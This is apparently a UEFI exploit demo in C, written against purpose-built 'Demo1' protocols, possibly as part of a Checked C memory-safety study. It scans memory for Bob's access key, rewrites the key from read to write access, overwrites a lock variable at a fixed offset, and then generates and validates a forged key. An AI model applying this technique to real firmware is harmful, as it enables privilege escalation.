#include <Uefi.h>
#include <Library/UefiLib.h>
#include <Library/UefiBootServicesTableLib.h>
#include <Protocol/LoadedImage.h>
#include <Protocol/ShellParameters.h>

#include <Protocol/Shell.h>
#include <Library/ShellLib.h>

#include "../Demo1_Access_Key/Demo1_Access_Key.h"
#include "../Demo1_Bob/Demo1_Bob.h"
#include "../Demo1_Alice/Demo1_Alice.h"

Demo1_Access_Key_PROTOCOL * AccessKeyProtocol = NULL;
Demo1_Bob_PROTOCOL * BobProtocol;

#define EXAMPLEAPP_VARNAME   L"ExampleVar"

EFI_STATUS
        EFIAPI
Demo1Exploit_Entry (
        IN EFI_HANDLE imgHandle,
        IN EFI_SYSTEM_TABLE* sysTable
)
{
EFI_STATUS Status;
EFI_STATUS retval;
BOOLEAN retbool;
gBS = sysTable->BootServices;
gBS->SetWatchdogTimer(0, 0, 0, NULL); // UEFI apps automatically exit after 5 minutes. Stop that here.

Print(L"Exploit Started\r\n");

/* Locate Access Key Protocol and Bob Protocol*/
gBS->LocateProtocol(&gDemo1BobProtocolGuid, NULL, (VOID *)&BobProtocol);
gBS->LocateProtocol(&gDemo1AccessKeyProtocolGuid, NULL, (VOID *)&AccessKeyProtocol);
DEMO1_ACCESS_KEY * my_access_key= AllocatePool(sizeof(DEMO1_ACCESS_KEY));

// Known key address for Bob so find get the key stored there
UINTN *Address = NULL;
UINTN Size = sizeof(DEMO1_ACCESS_KEY);
DEMO1_ACCESS_KEY *Data= AllocatePool(Size);
UINTN* _Array CheckedAddress : bounds(CheckedAddress, CheckedAddress + Size) = NULL;

//Loop through all of the address and save the key if the header matches a key header
for(UINTN addr = 0; addr < MAX_UINTN; addr += Size)
{
Address = (UINTN *)addr;
//CheckedAddress = _Assume_bounds_cast<VOID* _Array>((UINTN*)addr, byte_count(Size));
//Print (L"Current Address: 0x%016llx\n",  CheckedAddress);
Status = BobProtocol->Demo1BobDataProvider(BobProtocol, (void*)Address, (void**)&Data, Size);
if(Data->access_key_store[1] == 0xDEC0DEBABB1E10AD)
{
Address = (UINTN *)addr;
Print(L"Found Bobs Key: (0x%016llx..%016llx) \r\n", Data->access_key_store[0], Data->access_key_store[1]);
Print (L"Keys Address: 0x%016llx\n", Address);
break;
}
}


// Change key from read to write
Data->access_key_store[1] = (ACCESS_KEY_MAGIC << MAGIC_SIZE) + WRITE_ACCESS;
Print(L"Modified key to have write access");

// Write to
UINTN ExampleVar_Value = 0;
Print(L"Setting Access Variable to - 0x%08llx\r\n", ExampleVar_Value);
UINTN BufferSize = sizeof(ExampleVar_Value);

Status  = sysTable->RuntimeServices->SetAccessVariable (
        ALICEMODE_VARNAME,
        &gAliceVariableGuid,
        EFI_VARIABLE_BOOTSERVICE_ACCESS | EFI_VARIABLE_RUNTIME_ACCESS | EFI_VARIABLE_NON_VOLATILE,
        Data,
        BufferSize,
        &ExampleVar_Value
);
if (EFI_ERROR (Status)) {
DEBUG ((DEBUG_ERROR, "%a: variable '%s' could not be written - bailing!\n", __FUNCTION__, ALICEMODE_VARNAME));
return Status;
}
Print(L"Set Access Variable Success\r\n");

/* Generate Access Key */
Print(L"Call Generate Access Key before changing accessKeyLock\r\n");
retval = AccessKeyProtocol->Demo1GenerateAccessKey(AccessKeyProtocol, NULL, TRUE, my_access_key);
if (retval == 0) {
Print(L"Succescfully created an access key...Failed\r\n");
return EFI_ABORTED;
}
Print(L"Failed to generate access key...Success\r\n");

//Change accessKeyLock
Print(L"Attempting to write to accessKeyLock\r\n");
UINTN *getExampleVar_Value = (UINTN *)((UINTN)Address + 0x6E78);// accessKeyLock
Print (L"AccessKeyLock Address: 0x%016llx\n", getExampleVar_Value);
BufferSize = sizeof(getExampleVar_Value);
Status = gST->RuntimeServices->GetAccessVariable (
        ALICEMODE_VARNAME,
        &gAliceVariableGuid,
        NULL,
        Data,
        &BufferSize,
        getExampleVar_Value
);
if (EFI_ERROR (Status)) {
DEBUG ((DEBUG_ERROR, "%a: variable '%s' could not be read - bailing!\n", __FUNCTION__, EXAMPLEAPP_VARNAME));
return Status;
}
Print(L"Successfully wrote to accessKeyLock - %d\r\n", *getExampleVar_Value);

/* Generate Access Key */
Print(L"Generate New Access Key\r\n");
retval = AccessKeyProtocol->Demo1GenerateAccessKey(AccessKeyProtocol, NULL, TRUE, my_access_key);
if (retval != 0) {
Print(L"Failed to generate access key\r\n");
return EFI_ABORTED;
}
Print(L"Successfully generated a new access key: (0x%016llx..%016llx) \r\n",
my_access_key->access_key_store[0], my_access_key->access_key_store[1]);

/* Validate Access Key */
Print(L"Validate Access Key \r\n");
AccessKeyProtocol->Demo1ValidateAccessKey(AccessKeyProtocol, NULL, my_access_key, TRUE, &retbool);
if (retbool == FALSE) {
Print(L"Could not validate key\r\n");
return EFI_ABORTED;
}
Print(L"Key is valid\r\n");

Print(L"Exploit finished\r\n");
return EFI_SUCCESS;
}
